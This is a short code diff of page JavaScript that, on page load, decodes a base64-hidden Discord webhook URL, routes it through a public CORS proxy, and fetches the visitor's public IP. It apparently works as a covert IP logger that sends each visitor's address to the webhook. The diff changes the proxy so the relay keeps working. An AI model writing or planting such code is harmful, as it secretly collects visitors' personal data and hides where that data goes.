@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Webhook & IP Logic
   const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ1NzMxOTI0NTA1ODE3MS9hQmN4dTdKcGRiMTNNZlpPZ2JEbXRqYWVFMmNMWTRMX19GcWwzSkpHczRoYkdYQjJybmNiMHRORm9lUGp5TC0zb09NcQ==");
-  const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
+  const proxyUrl = "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(webhookUrl);
   let userIp = "Bilinmiyor";
 
   fetch('https://api.ipify.org?format=json')
